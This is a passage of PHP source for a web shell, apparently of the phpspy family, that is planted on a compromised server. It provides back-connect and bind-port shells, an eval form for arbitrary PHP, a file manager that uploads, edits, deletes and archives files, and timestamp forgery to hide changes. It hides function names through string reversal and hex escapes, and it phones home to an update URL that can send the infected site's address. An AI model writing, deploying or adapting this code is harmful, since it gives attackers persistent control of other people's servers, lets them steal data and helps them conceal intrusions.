    echo '<div class="blocktop"><a href="javascript:g(\'backconnect\');">Back Connect</a></div><div class="blocksep">|</div>
    <div class="blocktop"><a href="javascript:g(\'bindport\');">Bind Port</a></div><div class="blocksep">|</div>';
}
;
echo '<div class="blocktop"><a href="javascript:g(\'settings\');">Shell Settings</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'checkupdates\');">Check for Shell Update</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'SelfRemove\');">Remove Self</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'logout\');">Logout</a></div>
			</div></div></td>
	</tr>
</table>
<table id="maintable" width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
';
$errmsg && m($errmsg);
if (isset($_SESSION[$prefixme.'updateready']) && time() > $_SESSION[$prefixme.'updateready']){
unset($_SESSION[$prefixme.'updatready']);
}
if ($action == 'dismissupdate'){
  	$_SESSION[$prefixme.'showupdate'] = "false";
  	if ($p1 == ''){
  		$p1 = 'file';
  	}
  	$action = $p1;
}elseif($action != "checkupdates" && $_SESSION[$prefixme.'showupdate'] != "false"){
	if ($checkforupdates) {
  	if (isset($_SESSION[$prefixme.'updateready'])){
   		$res = $_SESSION[$prefixme.'updateready'];
  	}else{
  	    $cforupurl = $checkforupdatesurl;
  		$parsed = parse_url($cforupurl);
        $query = isset($parsed['query']) ? $parsed['query'] : "";
        $baseurl = rtrim(str_replace($query, "", $cforupurl), "?");
        parse_str($query, $vars);
        $add = array("v"=>$version);
        if($helpsupportbooter != false) $add = array_merge($add, array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
        $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
    	$res          = file_get_contents($cuuff);
    	if (!$res) {
        $res = get_data($cuuff);
    	}
 	 	}
  	if (isset($_SESSION[$prefixme.'updateready']) && $res != 'true'){
  		$res = "";
  	}
    if ($res != "") {
    				m('<span style="float:center;">Shell Update available! <a href="javascript:g(\'checkupdates\');">Update Now!</a></span>   <span style="float:right;"><a href="javascript:g(\'dismissupdate\',null,\''.$action.'\');">Dismiss</a></span>');
						$_SESSION[$prefixme.'updateready'] = 'true';
    }else{
    		if (!isset($_SESSION[$prefixme.'updateready'])){
    			$_SESSION[$prefixme.'updateready'] = time() + 300;
    		}
    }
	}
}
register_shutdown_function('shutdownFunction', $phpcode, $action, $charsetpage, $charsetpagedb);
function shutDownFunction($phpcode, $action, $charsetpage, $charsetpagedb) {
    $error = error_get_last();
    if ($error['type'] == 1) {
        formhead(array(
            'title' => "\x45\x76\x61\x6C PHP Code"
        ));
        makehide('action', 'laev');
        $phpcode = $phpcode == "" ? "<" . "?PHP\n\n\n\n?" . ">" : $phpcode;
        makeinput(array(
        'title' => 'Run From Directory:',
        'name' => 'setrunfrom',
        'value' => ($setrunfrom != "") ? $setrunfrom : str_replace("\\", "/", dirname(__FILE__)) . "/"
        ));
        maketext(array(
            'title' => 'PHP Code',
            'name' => 'phpcode',
            'dataeditor' => 'php',
            'value' => htmlspecialchars($phpcode)
        ));
        p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
        p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
        printaceext();
        if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
        formfooter();
        echo '</td></tr></table><div style="padding:10px;border-bottom:1px solid #3498db;border-top:1px solid #2c3e50;background:#34495e;"><span style="float:left;">Charset:';
        makeselect(array('name'=>'charsetpage','option'=>$charsetpagedb,'selected'=>$charsetpage,'onchange'=>'g(\''.$action.'\',null,null,null,null,null,null,this.value);'));
        echo '</span><span style="display: block; text-align: right;">';
        debuginfo();
        ob_end_flush();
        ;
        echo '</span></div></body></html>';
    } 
}
if ($action == 'phpinfo') {
    if (IS_PHPINFO) {
        $f=strrev(strrev("on")."itc".strrev("e_fun")."tae"."\x72\x63");
        ob_start();
        phpinfo();
        $prgm('%<style type="text/css">(.*?)</style>.*?(<body>.*</body>)%s', ob_get_clean(), $matches);
        echo "<div class='phpinfodisplay'><style type='text/css'>\n",
        join( "\n",array_map($f('$i', 'return ".phpinfodisplay " . ' . "\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65" . '( "/,/", ",.phpinfodisplay ", $i );'),$prgs( '/\n/', $matches[1] ))),"</style>\n",$matches[2],"\n</div>\n";
    } else {
        $errmsg = 'phpinfo() function has non-permissible';
    }
}elseif ($action == 'file') {
    $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
    if ($newdirname) {
        $mkdirs = $nowpath . $newdirname;
        if (file_exists($mkdirs)) {
            m('Directory has already existed');
        } else {
            m('Directory created ' . (@mkdir($mkdirs, 0777) ? 'success' : 'failed'));
            @chmod($mkdirs, 0777);
        }
    } elseif ($doupfile) {
        $fail = false;
        foreach ($_FILES['uploadfile']['name'] as $f => $name) {
            $fail = @copy($_FILES['uploadfile']['tmp_name'][$f], $uploaddir . '/' .str_replace("/","_", $_FILES['uploadfile']['name'][$f]));
            if ($fail != true){
                break;
            }
        }
        m('File upload ' . ($fail ? 'success' : 'failed'));
        /*if($isajax){
            ob_clean();
            die('File upload ' . ($fail ? 'success' : 'failed'));
        }*/
    } elseif ($editfilename && ($filecontent || $submit)) {
        $fp        = @$pen($editfilename, 'w');
        $writingit = @$feather($fp, $filecontent);
        @$pixel($fp);
        if (!$writingit) {
            $writingit = file_put_contents($editfilename, $filecontent);
        }
        if (!$writingit && $filecontent == "") {
            $writingit = true;
        }
        $writeit = ($writingit ? 'success' : 'failed');
        m('Save file ' . $writeit);
    } elseif ($pfile && $newperm) {
        if (!file_exists($pfile)) {
            m('The original file does not exist');
        } else {
            $newperm = base_convert($newperm, 8, 10);
            m('Modify file attributes ' . (@chmod($pfile, $newperm) ? ' success' : ' failed'));
        }
    } elseif ($oldname && $newfilename) {
        $nname = $nowpath . $newfilename;
        if (file_exists($nname) || !file_exists($oldname)) {
            m($nname . ' has already existed or original file does not exist');
        } else {
            m(basename($oldname) . ' renamed ' . basename($nname) . (@rename($oldname, $nname) ? ' success' : ' failed'));
        }
    } elseif ($sname && $tofile) {
        if (file_exists($tofile) || !file_exists($sname)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            m(basename($sname) . ' copied ' . (@copy($sname, $tofile) ? basename($tofile) . ' success' : ' failed'));
        }
    } elseif (isset($unzipfile)) {
        $zip = new ZipArchive;
        $res = $zip->open($unzipfile);
        if ($res === TRUE) {
            $zip->extractTo(dirname($unzipfile) . "/" . basename($unzipfile, ".zip") . "/");
            $zip->close();
            m("File successfully unzipped!");
        } else {
            m("The file could not be unzipped...");
        }
    } elseif (isset($ungzfile)) {
        $p = new PharData($ungzfile);
        $p->decompress();
        if (file_exists(rtrim($ungzfile, ".gz"))){
            m("File successfully uncompressed!");
        } else {
            m("The file could not be uncompressed...");
        }
    } elseif (isset($untarfile)) {
        $p = new PharData($untarfile);
        if ($p->extractTo(rtrim($untarfile,".tar")) . "/"){
            m("File successfully extracted!");
        } else {
            m("The file could not be extracted...");
        }
    } elseif ($curfile && $tarfile) {
        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            $time = @filemtime($tarfile);
            m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? ' success' : ' failed'));
        }
    } elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
        if (!@file_exists($curfile)) {
            m(basename($curfile) . ' does not exist');
        } else {
            $time = strtotime("$year-$month-$day $hour:$minute:$second");
            m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? ' success' : ' failed'));
        }
    } elseif ($doing == 'zipfiles'){
        if ($dl) {
            $allf = "";
            foreach ($dl as $filepath) {
                if (is_dir($filepath)) {
                    $allf .= get_file_list($filepath . "/");
                }else{
                    $allf .= $filepath;
                }
            }
            $zip = new ZipArchive;
            $fn = md5($allf);
            $zip->open($nowpath . $fn. '.zip', ZipArchive::CREATE);
            foreach ($dl as $filepath) {
                if (is_dir($filepath)) {
                    get_files_from_folder($filepath . "/", str_replace_first($nowpath,"",$filepath) . "/",$zip);
                }else{
                    $zip->addFile($filepath, basename($filepath));
                }
            }
            if (!$zip->close()) {
	            m('There was a problem writing the ZIP archive.');
            } else {
	            m('Successfully created the ZIP Archive as ' . $fn . '.zip!');
            }
        } else {
            m('Please select folder/file(s)');
        } 
    } elseif ($doing == 'delfiles') {
        if ($dl) {
            $dfiles = '';
            $succ   = $fail = 0;
            foreach ($dl as $filepath) {
                if (is_dir($filepath)) {
                    if (@deltree($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                } else {
                    if (@unlink($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                }
            }
            m('Delete file/folders has completed. The results are Total: ' . count($dl) . ', Success: ' . $succ . ', Fail: ' . $fail);
        } else {
            m('Please select folder/file(s)');
        }
    }elseif($tofolder && $srcdir){
        recurse_copy($srcdir,$tofolder);
            m('Copy Folder has finished.');
    }
    formhead(array(
        'name' => 'createdir'
    ));
    makehide('newdirname');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'fileperm'
    ));
    makehide('newperm');
    makehide('pfile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'copyfolder'
    ));
    makehide('srcdir');
    makehide('tofolder');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array(
        'name' => 'copyfile'
    ));
    makehide('sname');
    makehide('tofile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'unzipfile'
    ));
    makehide('unzipfile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'ungzfile'
    ));
    makehide('ungzfile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'untarfile'
    ));
    makehide('untarfile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'rename'
    ));
    makehide('oldname');
    makehide('newfilename');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'fileopform'
    ));
    makehide('action');
    makehide('opfile');
    makehide('dir');
    formfoot();
    formhead(array(
        'name' => 'getsize'
    ));
    makehide('getdir');
    makehide('dir');
    formfoot();
    echo '<div id="astatus" style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;display:none;"></div>';
    $free = @disk_free_space($nowpath);
    !$free && $free = 0;
    $all = @disk_total_space($nowpath);
    !$all && $all = 0;
    $used = $all - $free;
    p('<h2>File Manager - Current disk free ' . sizecount($free) . ' of ' . sizecount($all) . ' (' . @round(100 / ($all / $free), 2) . '%)</h2>');
    $cwd_links = '';
    $path      = explode('/', $nowpath);
    $n         = count($path);
    for ($i = 0; $i < $n - 1; $i++) {
        $cwd_links .= '<a href="javascript:godir(\'';
        for ($j = 0; $j <= $i; $j++) {
            $cwd_links .= str_replace("'", "\'", $path[$j]) . '/';
        }
        $cwd_links .= '\');">' . $path[$i] . '/</a>';
    }
    ;
    echo '<script type="text/javascript">
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$(\'inputnav\').style.display = "";
			$(\'pathnav\').style.display = "none";
			//hidenav();
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$(\'inputnav\').style.display = "none";
	$(\'pathnav\').style.display = "";
}
</script>
<div style="background:#34495e;margin-bottom:10px;">
	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100%">';
    echo $cwd_links . ' - ' . getChmod($nowpath) . ' / ' . PermsColor($nowpath) . getUser($nowpath);
    ;
    echo ' (';
    echo $dir_writeable;
    ;
    echo ')</td>
			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
		</tr>
	</table>
	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
	<form action="" method="post" id="godir" name="godir" onSubmit="window.onbeforeunload = null;">
		<tr>
			<td nowrap>Current Directory (';
    echo $dir_writeable;
    ;
    echo ', ';
    echo getChmod($nowpath);
    ;
    echo ')</td>
			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input onmouseover="this.focus();" class="input" name="dir" value="';
    echo $nowpath;
    ;
    echo '" type="text" style="width:99%;margin:0 8px;"></td>
			<td nowrap><input class="bt" value="GO" type="submit"></td>
		</tr>
	</form>
	</table>
';
    if (IS_WIN && IS_COM) {
        $obj = new COM("scripting.file\x73y\x73t\x65mobject");
        if ($obj && is_object($obj) && $obj->Drives) {
            echo '<div class="drives">';
            $DriveTypeDB = array(
                0 => 'Unknow',
                1 => 'Removable',
                2 => 'Fixed',
                3 => 'Network',
                4 => 'CDRom',
                5 => 'RAM Disk'
            );
            $comma       = '';
            foreach ($obj->Drives as $drive) {
                if ($drive->Path) {
                    p($comma . '<a href="javascript:godir(\'' . str_replace("'", "\'", $drive->Path) . '/\');">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
                    $comma = '<span>|</span>';
                }
            }
            echo '</div>';
        }
    }
    ;
    echo '</div>
';
  $sort = array('filename', 1);
  if($p1) {
		if($prgm('!s_([A-z_]+)_(\d{1})!', $p1, $match)) {
			$sort = array($match[1], (int)$match[2]);
		}
	}
	echo '<script>function UploadFiles(files) {
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            if(xhr.status == 200){
                var thedom = xhr.responseText.toDOM();
                $id("thefilelist").innerHTML = thedom.getElementById("thefilelist").innerHTML;
                $id("astatus").innerHTML = thedom.getElementById("theresult").innerHTML;
                orsc();
            }else{
                $id("astatus").innerHTML = "File upload failed... Response code: " + xhr.status;
            }
        }
    }
	if (xhr.upload) {
	    var formData = new FormData();
	    for (var i = 0, file; file = files[i]; ++i) {
            formData.append("uploadfile[]", file);
        }
	    formData.append("uploaddir","' . $nowpath . '");
	    formData.append("dir","' . $nowpath . '");
	    formData.append("doupfile","Upload");
	    xhr.upload.addEventListener("progress", function(e) {
	        if($id("theresult")) $id("theresult").style.display = "none";
	        $id("astatus").style.display = "block";
			$id("astatus").innerHTML = "Uploading files...(" + Math.round(e.loaded / e.total * 100) + "%)";
		}, false);
		document.body.scrollIntoView();
	    xhr.open("POST", "' . $_SERVER['PHP_SELF'] . '", true);
		xhr.setRequestHeader("X_UPLOAD", "true");
		xhr.send(formData);
	}
}</script>';
    tbhead("thefilelist");
    p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" onSubmit="window.onbeforeunload = null;"><div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $nowpath . '" type="hidden" /><input name="dir" value="' . $nowpath . '" type="hidden" /></div></form>');
    p('<a href="javascript:godir(\'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');">WebRoot</a>');
    p(' | <a href="javascript:godir(\'' . str_replace('\\', '/', str_replace("'", "\'", getcwd())) . '\');">ScriptPath</a>');
    p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\');">View All</a>');
    p(' | View Writable ( <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'dir\');">Directory</a>');
    p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'file\');">File</a> )');
    p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\'' . str_replace("'", "\'", $nowpath) . '\');">Create File</a>');
    p('<div style="padding:5px 0;"><form action="' . $self . '" method="POST" onSubmit="window.onbeforeunload = null;">Find string in files(current folder): <input onmouseover="this.focus();" class="input" name="findstr" value="' . $findstr . '" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input onmouseover="this.focus();" class="input" name="writabledb" value="' . $writabledb . '" type="text" />');
    makeselect(array('name' => 'findin',
        'option' => array('Find in File Names','Find in File Content'),
        'selected' => $findin,
        'nokey' => 1));
    p('<input name="dir" value="' . $dir . '" type="hidden" /> <label><input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular Expressions</label> <label><input name="subdirs" value="1" type="checkbox" ' . ($subdirs ? 'checked' : '') . ' /> Search Subdirectories</label></form></div></td></tr>');
   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null, null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
	p('<td width="16%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_mtime_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
	p('<td width="10%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_size_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
    p('<td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
    $dirdata  = array();
    $filedata = array();
    if ($view_writable == 'dir') {
        $dirdata  = GetWDirList($nowpath);
        $filedata = array();
    } elseif ($view_writable == 'file') {
        $dirdata  = array();
        $filedata = GetWFileList($nowpath);
    } else {
        $dirs = @opendir($dir);
        if($subdirs && $findstr) $all = glob_recursive($dir . "*");
        $i = 0;
        while (($subdirs == false && false !== ($file = @readdir($dirs))) || ($subdirs == true && strlen($findstr) > 0 && $i <= count($all))) {
            if($subdirs && $findstr){
                $file = $all[$i];
                $i++;
            }
            if ($findstr){
                if (!in_array(getext($file), explode(',', $writabledb))) continue;
                if (@is_dir($nowpath . $file)) continue;
                $infile = ($findin == "Find in File Content");
                if ($re){
                    if ($infile){
                        if (!$prgm('@' . $findstr . '@', @file_get_contents(($subdirs ? "" : $nowpath) . $file))) continue;
                    }else{
                        if (!$prgm('@' . $findstr . '@', $file)) continue;
                    }
                }else{
                    if ($infile){
                        if (!(strpos(@file_get_contents(($subdirs ? "" : $nowpath) . $file), $findstr) !== FALSE)) continue;
                    }else{
                        if (!(strpos($file, $findstr) !== FALSE)) continue;
                    }
                }
            }
            $filepath = ($subdirs ? "" : $nowpath) . $file;
            if (@is_dir($filepath)) {
                $dirdb['filename']    = $file;
                $dirdb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                $dirdb['dirchmod']    = getChmod($filepath);
                $dirdb['dirperm']     = PermsColor($filepath);
                $dirdb['fileowner']   = getUser($filepath);
                $dirdb['dirlink']     = $nowpath;
                $dirdb['server_link'] = $filepath;
                if ($file=='..') {
									$dirdata['up']=1;
								} else {
									$dirdata[]=$dirdb;
								}
            } else {
                $filedb['filename']    = $file;
                $filedb['size']        = @filesize($filepath);
                $filedb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                $filedb['filechmod']   = getChmod($filepath);
                $filedb['fileperm']    = PermsColor($filepath);
                $filedb['fileowner']   = getUser($filepath);
                $filedb['dirlink']     = $nowpath;
                $filedb['server_link'] = $filepath;
                $filedata[]            = $filedb;
            }
        }
        unset($dirdb);
        unset($filedb);
        @closedir($dirs);
    }
  $dir_i = '0'; 
  if (isset($dirdata['up'])) {
		p('<tr class=' . bg() . '>');
    p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\'' . str_replace("'", "\'", getUpPath($nowpath)) . '\');">Parent Directory</a></td>');
    p('</tr>');
	}
	unset($dirdata['up']);
	if ($sort[0] == "filename"){
		if ($sort[1] != 0){
    	@sort($dirdata);
    	@sort($filedata);
 		}else{
  		@rsort($dirdata);
  		@rsort($filedata);
  	}
  }elseif($sort[0] == "size"){
  	if ($sort[1] != 0){
    	@sort($dirdata);
    	foreach ($filedata as $key => $row) {
    		$volume[$key]  = $row['size'];
			}
			array_multisort($volume, SORT_DESC, $filedata);
 		}else{
  		@sort($dirdata);
  		foreach ($filedata as $key => $row) {
    		$volume[$key]  = $row['size'];
			}
			array_multisort($volume, SORT_ASC, $filedata);
  	}
  }elseif($sort[0] == "mtime"){
  	if ($sort[1] != 0){
  			usort($dirdata, function($a1, $a2) {
   				return strtotime($a1['mtime']) - strtotime($a2['mtime']);
				});
				usort($filedata, function($a1, $a2) {
   				return strtotime($a1['mtime']) - strtotime($a2['mtime']);
				});
  	}else{
  			usort($dirdata, function($a1, $a2) {
   				return strtotime($a2['mtime']) - strtotime($a1['mtime']);
				});
				usort($filedata, function($a1, $a2) {
   				return strtotime($a2['mtime']) - strtotime($a1['mtime']);
				});
  	}
  }
  if (!empty($dirdata)){
    foreach ($dirdata as $key => $dirdb) {
        if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
            if ($getdir && $getdir == $dirdb['server_link']) {
                $attachsize = dirsize($dirdb['server_link']);
                $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
            } else {
                $attachsize = '<a href="javascript:getsize(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\',\'' . $dir . '\');">Stat</a>';
            }
            $thisbg = bg();
            p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
            p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $dirdb['server_link'] . '"></td>');
            p('<td><a href="javascript:godir(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['filename'] . '</a></td>');
            p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . $dirdb['server_link'] . '\',\'' . $dirdb['dirlink'] . '\');">' . $dirdb['mtime'] . '</a></td>');
            p('<td nowrap>' . $attachsize . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['dirchmod'] . '</a> / ');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>');
            p('<td nowrap><a href="javascript:rename(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">Rename</a> | <a href="javascript:copyfolder(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">Copy</a> | <a href="javascript:dofile(\'downfolder\',\'' . str_replace("'", "\'", $dirdb['server_link'])  . '\');">Download</a></td>');
            p('</tr>');
            $dir_i++;
        } else {
            if ($dirdb['filename'] == '..') {
                p('<tr class=' . bg() . '>');
                p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\'' . str_replace("'", "\'", getUpPath($nowpath)) . '\');">Parent Directory</a></td>');
                p('</tr>');
            }
        }
    }
    }
    p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
    $file_i = '0';
    if (!empty($filedata)) {
    foreach ($filedata as $key => $filedb) {
        if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
            if (strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false){
                $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"], '', $filedb['server_link']);
            }else{
                $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"], '', realpath($filedb['server_link']));
            }
            $thisbg  = bg();
            p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
            p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $filedb['server_link'] . '"></td>');
            p('<td>' . ((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false || strpos(realpath($filedb['server_link']), $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="' . (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . (str_replace("//", "/", "/" . $fileurl)) . '" target="_blank">' . $filedb['filename'] . '</a>' : $filedb['filename']) . '</td>');
            p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\',\'' . $filedb['dirlink'] . '\');">' . $filedb['mtime'] . '</a></td>');
            p('<td nowrap>' . sizecount($filedb['size']) . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">' . $filedb['filechmod'] . '</a> / ');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>');
            p('<td nowrap>');
            if(endsWith($filedb['filename'],".zip")){
                p('<a href="javascript:unzipfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Unzip</a> | ');
            }
            if(endsWith($filedb['filename'],".gz")){
                p('<a href="javascript:ungzfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Uncompress</a> | ');
            }
            if(endsWith($filedb['filename'],".tar")){
                p('<a href="javascript:untarfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Extract</a> | ');
            }
            p('<a href="javascript:dofile(\'downfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Download</a> | ');
            p('<a href="javascript:copyfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Copy</a> | ');
            p('<a href="javascript:opfile(\'editfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
            p('<a href="javascript:rename(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Rename</a>');
            p('</td></tr>');
            $file_i++;
        }
    }
    }
    p('<tr class="head"><td></td><td>File Name</td><td width="16%">Last Modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
    p('<tr class="' . bg() . '"><td align="center"><input id= "ckallbx" name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete Selected</a> | <a href="javascript:dofile(\'zipfiles\');">Zip Selected</a></td><td align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
    p('</form></table>');
}elseif ($action == 'settings'){
	if (isset($setpass) && isset($setpass2)){
		if (($setpass2 == $setpass)){
			if((md5($curpass) == $pass)){
				$org = file_get_contents($prg('@\(.*\(.*$@', '', __FILE__));
				$prgma("/(<\?)(.*?)(\?>)/is", $org, $matches);
        		$newv = $matches[0][0];
        		$oldsettings = $newv;
				$newv = $prg("/\\\$pass[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."pass               = \"" . md5($setpass) ."\";",$newv);
				$newv = str_replace($oldsettings, $newv, $org);
				$fp        = @$pen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
        $writingit = @$feather($fp, $newv);
        @$pixel($fp);
        if (!$writingit) {
        	$writingit = file_put_contents($prg('@\(.*\(.*$@', '', __FILE__), $newv);
        }
        $writeit = ($writingit ? 'successfully...' : 'unsuccessfully...');
				m('Password updated '.$writeit);
				$pass = md5($setpass);
        $_SESSION[$prefixme.'loginpass'] = $pass;
			}else{
				m('Incorrect Current Password...');
			}
		}else{
			m('New passwords don\'t mach.');
		}
	}
	if (isset($setcfuu)){
		$org = file_get_contents($prg('@\(.*\(.*$@', '', __FILE__));
		$prgma("/(<\?)(.*?)(\?>)/is", $org, $matches);
        $newv = $matches[0][0];
        $oldsettings = $newv;
		$setaep = ($setaep == 'on') ? 'true' : 'false';
		$setcfu = ($setcfu == 'on') ? 'true' : 'false';
		$sethsb = ($sethsb == 'on') ? 'true' : 'false';
		$newv = $prg("/\\\$adaptiveerrorpage[^=|\n|\r]*=[^;|=|\n|\r]*\;/",strrev(" =  egaprorreevitpada$\\") . $setaep . ";",$newv); 
		$newv = $prg("/\\\$checkforupdatesurl[^=|\n|\r]*=[^;|\n|\r]*\;/",strrev("\" = lrusetadpurofkcehc$\\") . $setcfuu . "\";",$newv);
